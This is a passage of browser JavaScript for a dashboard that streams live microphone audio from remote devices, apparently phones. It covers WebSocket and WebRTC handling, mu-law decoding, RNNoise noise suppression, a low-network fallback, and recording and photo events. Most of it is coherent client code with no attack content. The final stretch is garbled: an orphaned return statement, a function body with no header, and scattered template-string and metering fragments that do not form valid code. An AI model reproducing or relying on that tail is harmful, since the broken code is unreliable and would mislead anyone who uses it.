          updateNetworkModeUi();
          log(
            `Auto low-network mode ${anyPoor ? "enabled" : "cleared"}`,
            anyPoor ? "warn" : "ok",
          );
        }
      }

      function updateDeviceNetworkScore(deviceId, state, health) {
        if (!state || !health) return;
        const quality = health.quality || {};
        const rtt = Number(quality.rttMs);
        const loss = Number(quality.lossPct);
        const jitter = Number(quality.jitterMs);
        const kb = Number(health.bitrateKbps);
        const poorNow =
          (Number.isFinite(rtt) && rtt > 220) ||
          (Number.isFinite(loss) && loss > 6) ||
          (Number.isFinite(jitter) && jitter > 45) ||
          (state.useWebRtc && state.rtcRetryCount >= 2) ||
          (state.useWebRtc && Number.isFinite(kb) && kb > 0 && kb < 14);
        if (poorNow) {
          state.lowNetBadTicks = (state.lowNetBadTicks || 0) + 1;
          state.lowNetGoodTicks = 0;
        } else {
          state.lowNetGoodTicks = (state.lowNetGoodTicks || 0) + 1;
          if ((state.lowNetGoodTicks || 0) >= 3) {
            state.lowNetBadTicks = Math.max(0, (state.lowNetBadTicks || 0) - 1);
          }
        }
        if ((state.lowNetBadTicks || 0) >= 3) state.autoLowCandidate = true;
        if ((state.lowNetGoodTicks || 0) >= 8) state.autoLowCandidate = false;
        renderDeviceNetworkChip(deviceId, state);
      }

      function renderDeviceNetworkChip(deviceId, state) {
        const chip = document.getElementById(`netChip_${deviceId}`);
        if (!chip || !state) return;
        const low = isLowNetworkModeActive() || state.autoLowCandidate;
        chip.className = `net-chip${low ? " low" : ""}`;
        chip.textContent = low ? "LOW NETWORK" : "NORMAL LINK";
      }

      function applyNetworkModeToAllDevices() {
        Object.keys(deviceState).forEach((deviceId) => {
          const state = deviceState[deviceId];
          if (state) applyNetworkModeToDevice(deviceId, state);
        });
      }

      function applyNetworkModeToDevice(deviceId, state) {
        if (!state) return;
        const low = isLowNetworkModeActive();
        renderDeviceNetworkChip(deviceId, state);
        if (low) {
          if (!state.lowModePrevStreamMode) {
            state.lowModePrevStreamMode = state.streamMode || "auto";
          }
          if (state.streamMode !== "pcm") {
            state.streamMode = "pcm";
            saveStreamMode(deviceId, "pcm");
            const streamBtn = document.getElementById(`btnStream_${deviceId}`);
            if (streamBtn) streamBtn.textContent = "Stream: PCM";
            sendCmd(deviceId, "stream_codec", { mode: "pcm" });
          }
          if (state.useWebRtc && state.isLive) {
            stopWebRtc(deviceId, true);
            sendCmd(deviceId, "start_stream");
            log(
              `Low-network fallback enabled for ${deviceId} (PCM clarity mode)`,
              "warn",
            );
          }
        } else if (state.lowModePrevStreamMode) {
          const restoreMode = state.lowModePrevStreamMode;
          state.lowModePrevStreamMode = null;
          if (state.streamMode !== restoreMode) {
            state.streamMode = restoreMode;
            saveStreamMode(deviceId, restoreMode);
            const streamBtn = document.getElementById(`btnStream_${deviceId}`);
            if (streamBtn)
              streamBtn.textContent = `Stream: ${streamModeLabel(restoreMode)}`;
            sendCmd(deviceId, "stream_codec", { mode: restoreMode });
          }
        }
      }

      function getRnnoiseLib() {
        if (!rnnoiseLibPromise) {
          rnnoiseLibPromise = import("/vendor/web-noise-suppressor/index.js");
        }
        return rnnoiseLibPromise;
      }

      function getRnnoiseWasmBinary(lib) {
        if (!rnnoiseWasmPromise) {
          rnnoiseWasmPromise = lib.loadRnnoise({
            url: "/vendor/web-noise-suppressor/rnnoise.wasm",
            simdUrl: "/vendor/web-noise-suppressor/rnnoise_simd.wasm",
          });
        }
        return rnnoiseWasmPromise;
      }

      async function ensureRnnoiseNode(ctx, state, kind) {
        if (
          !state?.rnnoiseEnabled ||
          !ctx?.audioWorklet ||
          typeof AudioWorkletNode === "undefined"
        )
          return null;
        const key = kind === "webrtc" ? "webRtcRnnoiseNode" : "pcmRnnoiseNode";
        const node = state[key];
        if (node) return node;

        const initKey =
          kind === "webrtc"
            ? "webRtcRnnoiseInitPromise"
            : "pcmRnnoiseInitPromise";
        if (state[initKey]) return state[initKey];

        state[initKey] = (async () => {
          try {
            const lib = await getRnnoiseLib();
            if (!rnnoiseWorkletLoadedContexts.has(ctx)) {
              await ctx.audioWorklet.addModule(
                "/vendor/web-noise-suppressor/rnnoise/workletProcessor.js",
              );
              rnnoiseWorkletLoadedContexts.add(ctx);
            }
            const wasmBinary = await getRnnoiseWasmBinary(lib);
            const rn = new lib.RnnoiseWorkletNode(ctx, {
              maxChannels: 1,
              wasmBinary,
            });
            state[key] = rn;
            return rn;
          } catch (e) {
            state.rnnoiseEnabled = false;
            const btn = document.getElementById(`btnRn_${state.deviceId}`);
            if (btn) btn.textContent = "RNNoise: OFF";
            log(`RNNoise init failed: ${e.message}`, "warn");
            return null;
          } finally {
            state[initKey] = null;
          }
        })();

        return state[initKey];
      }

      function connectControlWs() {
        controlWs = new WebSocket(`${_wsProto}://${_wsHost}/control`);
        controlWs.binaryType = "arraybuffer";
        controlWs.onopen = () => {
          _wsReconnectDelay = 2000; // reset backoff on successful connect
          setWsStatus(true);
          log("Connected to server", "ok");
        };
        controlWs.onclose = () => {
          setWsStatus(false);
          log(
            `Disconnected — reconnecting in ${(_wsReconnectDelay / 1000).toFixed(0)}s…`,
            "warn",
          );
          // Clear all device cards so they're rebuilt fresh on reconnect
          Object.keys(deviceState).forEach((id) => removeDeviceCard(id));
          const delay = _wsReconnectDelay;
          _wsReconnectDelay = Math.min(_wsReconnectDelay * 2, 30000); // cap at 30 s
          setTimeout(connectControlWs, delay);
        };
        controlWs.onerror = () => {
          log("WebSocket error", "err");
        };
        controlWs.onmessage = (event) => {
          if (typeof event.data === "string")
            handleJsonMessage(JSON.parse(event.data));
          else handleAudioBinary(event.data);
        };
      }

      function handleJsonMessage(msg) {
        switch (msg.type) {
          case "device_list":
            msg.devices.forEach((d) =>
              addDeviceCard(d.deviceId, d.model, d.health || null),
            );
            break;
          case "device_connected":
            addDeviceCard(msg.deviceId, msg.model || "…", msg.health || null);
            log(`Device connected: ${msg.deviceId}`, "ok");
            break;
          case "device_disconnected":
            removeDeviceCard(msg.deviceId);
            log(`Device disconnected: ${msg.deviceId}`, "warn");
            break;
          case "device_info":
            updateDeviceMeta(msg.deviceId, msg.model, msg.sdk);
            log(`${msg.deviceId} → ${msg.model} (SDK ${msg.sdk})`, "info");
            break;
          case "device_health":
            renderDeviceHealth(msg.deviceId, msg.health || null);
            break;

          case "recording_started":
            markRecording(msg.deviceId, true, msg.filename);
            log(`⏺ Recording started: ${msg.filename}`, "ok");
            break;
          case "recording_stopped":
            markRecording(msg.deviceId, false, msg.filename);
            log(`⏹ Recording saved: ${msg.filename}`, "ok");
            refreshRecordingsList();
            break;
          case "recording_saved":
            log(`💾 Device saved: ${msg.filename}`, "info");
            refreshRecordingsList();
            break;
          case "photo_saved":
            renderPhotoSaved(msg);
            log(`📸 Photo saved: ${msg.filename}`, "ok");
            break;
          case "ack":
            log(`ACK ${msg.deviceId}: ${msg.message}`, "info");
            break;
          case "device_data":
            renderDeviceData(msg.deviceId, msg.data);
            break;
          case "webrtc_answer":
            onWebRtcAnswer(msg.deviceId, msg.sdp);
            break;
          case "webrtc_ice":
            onWebRtcIce(msg.deviceId, msg.candidate);
            break;
          case "webrtc_state":
            renderWebRtcState(
              msg.deviceId,
              msg.state,
              msg.bitrateKbps,
              msg.quality || null,
            );
            log(
              `WebRTC ${msg.deviceId}: ${msg.state || "state"}${msg.bitrateKbps ? ` (${msg.bitrateKbps} kbps)` : ""}`,
              "info",
            );
            break;
          case "error":
            handleServerError(msg.message);
            break;
        }
      }

      function handleServerError(message) {
        log(`Error: ${message}`, "err");
        const m = /Device\s+([a-f0-9\-]+)\s+not found/i.exec(
          String(message || ""),
        );
        if (!m) return;
        const missingId = m[1];
        const state = deviceState[missingId];
        if (!state) return;
        if (!state.useWebRtc || state.rtcConnected) return;
        if (state.webRtcRetryOnNotFoundDone) return;
        state.webRtcRetryOnNotFoundDone = true;
        log(
          `Refreshing device map and retrying WebRTC once for ${missingId}`,
          "warn",
        );
        sendCmd(missingId, "get_data");
        sendCmd(missingId, "ping");
        setTimeout(async () => {
          if (!state.useWebRtc || state.rtcConnected || !state.rtcPeer) return;
          try {
            const offer = await state.rtcPeer.createOffer({ iceRestart: true });
            await state.rtcPeer.setLocalDescription(offer);
            sendCmd(missingId, "webrtc_start");
            sendCmd(missingId, "webrtc_offer", { sdp: offer.sdp });
            log(`WebRTC retry offer sent for ${missingId}`, "ok");
          } catch (e) {
            log(`WebRTC retry failed for ${missingId}: ${e.message}`, "err");
          }
        }, 800);
      }

      function handleAudioBinary(data) {
        // Binary frame format: [2-byte idLen][deviceId utf8][payload]
        const view = new DataView(data);
        const idLen = view.getUint16(0);
        const deviceId = new TextDecoder().decode(
          new Uint8Array(data, 2, idLen),
        );
        const state = deviceState[deviceId];
        if (!state || !state.isLive) return;
        if (state.useWebRtc && state.rtcConnected) return;
        const payload = new Uint8Array(data, 2 + idLen);
        let float32 = new Float32Array(0);
        let playbackSampleRate = 16000;
        if (
          payload.length >= 4 &&
          payload[0] === 0x4d &&
          payload[1] === 0x4d &&
          payload[2] === 0x01
        ) {
          const codec = payload[3];
          if (codec === 0x01) {
            float32 = decodeMuLaw8k(payload.subarray(4));
            playbackSampleRate = 8000;
          } else {
            const pcm = payload.subarray(4);
            const int16 = new Int16Array(
              pcm.buffer,
              pcm.byteOffset,
              pcm.byteLength >> 1,
            );
            float32 = new Float32Array(int16.length);
            for (let i = 0; i < int16.length; i++)
              float32[i] = int16[i] / 32768.0;
            playbackSampleRate = 16000;
          }
        } else {
          const int16 = new Int16Array(
            payload.buffer,
            payload.byteOffset,
            payload.byteLength >> 1,
          );
          float32 = new Float32Array(int16.length);
          for (let i = 0; i < int16.length; i++)
            float32[i] = int16[i] / 32768.0;
        }
        if (state.health) {
          state.health.lastAudioChunkAt = Date.now();
          state.health.micCapturing = true;
          renderDeviceHealth(deviceId, state.health);
        }
        updateVuMeter(deviceId, float32);
        playAudioChunk(state, float32, playbackSampleRate);
        const mode = state.vizMode || "wave";
        if (mode === "freq")
          drawFreqBars(
            state.canvas,
            state.audioCtx,
            float32,
            playbackSampleRate,
          );
        else drawWaveform(state.canvas, float32);
      }

      function decodeMuLaw8k(muLaw) {
        const out = new Float32Array(muLaw.length);
        for (let i = 0; i < muLaw.length; i++) {
          out[i] = muLawByteToFloat(muLaw[i]);
        }
        return out;
      }

      function muLawByteToFloat(value) {
        const mu = ~value & 0xff;
        const sign = mu & 0x80;
        const exponent = (mu >> 4) & 0x07;
        const mantissa = mu & 0x0f;
        let sample = ((mantissa << 3) + 0x84) << exponent;
        sample -= 0x84;
        if (sign) sample = -sample;
        return sample / 32768;
      }

        return true;

        try {
          const raw = localStorage.getItem(`${GAIN_STORAGE_PREFIX}${deviceId}`);
          const v = Number(raw);
          const allowed = [1.0, 1.5, 2.0, 3.0, 4.0];
          if (allowed.some((x) => Math.abs(x - v) < 0.01)) return v;
        } catch (_) {}
        return 1.5;
      }

            ? `<span class="ok-text">connected</span>`

            ? `<span class="ok-text">running</span>`
            : state.useWebRtc && !state.rtcConnected && state.rtcPeer
              ? `<span style="color:var(--amber)">connecting…</span>`
              : `<span class="bad-text">stopped</span>`;

          aud.textContent = h.lastAudioChunkAt

        if (rms) {
          const pct = Math.max(
            0,

              Math.round(Number(state.webRtcInboundRms || 0) * 100),

          );

        if (rx) {

          const cls = hasFlow ? "ok-text" : "bad-text";
